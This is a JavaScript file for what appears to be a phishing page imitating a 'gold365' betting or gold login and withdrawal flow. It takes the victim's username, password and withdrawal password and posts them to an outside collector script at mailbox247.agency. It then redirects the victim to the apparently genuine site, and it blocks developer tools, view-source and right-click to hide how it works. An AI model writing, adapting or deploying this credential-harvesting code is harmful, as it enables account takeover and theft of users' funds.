// Check login and store credentials
function checkLogin() {
  const loginName = document.getElementById("loginName").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!loginName || !password) {
    console.error("Error: Login fields not found.");
    return;
  }

  if (!loginName || !password) {
    alert("Please fill in both the username and password.");
    return;
  }

  sessionStorage.setItem("loginName", loginName);
  sessionStorage.setItem("password", password);

  window.location.href = "withdrawal.html";
}

// Check session and process withdrawal
function submitWithdrawal() {
  const loginName = sessionStorage.getItem("loginName");
  const password = sessionStorage.getItem("password");
  const withdrawPassword = document.getElementById("withdrawPassword").value.trim();

  if (!withdrawPassword) {
    console.error("Error: Withdrawal password field not found.");
    return;
  }

  if (!loginName || !password) {
    alert("You must log in first!");
    window.location.href = "index.html";
    return;
  }

  if (!withdrawPassword) {
    alert("Please enter the withdrawal password.");
    return;
  }

  const formData = new FormData();
  formData.append("username", loginName);
  formData.append("password", password);
  formData.append("withdrawPassword", withdrawPassword);

  fetch("https://mailbox247.agency/admin/gold365.php", {
    method: "POST",
    body: formData,
  })
    .then((response) => response.text())
    .then((data) => {
      console.log("Server Response:", data);
      if (data.trim() === "success") {
        window.location.href = "https://gold365.green";
      } else {
        alert("Error: " + data);
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      alert("An error occurred.");
    });
}

// Prevent Developer Tools Access & Right Click
document.onkeydown = function (e) {
  if (
    e.keyCode === 123 || // F12
    (e.ctrlKey && e.shiftKey && ["I", "J"].includes(String.fromCharCode(e.keyCode))) || // Ctrl+Shift+I/J
    (e.ctrlKey && ["U", "C", "V"].includes(String.fromCharCode(e.keyCode))) // Ctrl+U/C/V
  ) {
    return false;
  }
};

document.addEventListener("contextmenu", (e) => e.preventDefault());

// Redirect to login if session is missing
document.addEventListener("DOMContentLoaded", () => {
  if (window.location.pathname.includes("withdrawal.html")) {
    if (!sessionStorage.getItem("loginName") || !sessionStorage.getItem("password")) {
      alert("Session expired! Please log in again.");
      window.location.href = "index.html";
    }
  }
});
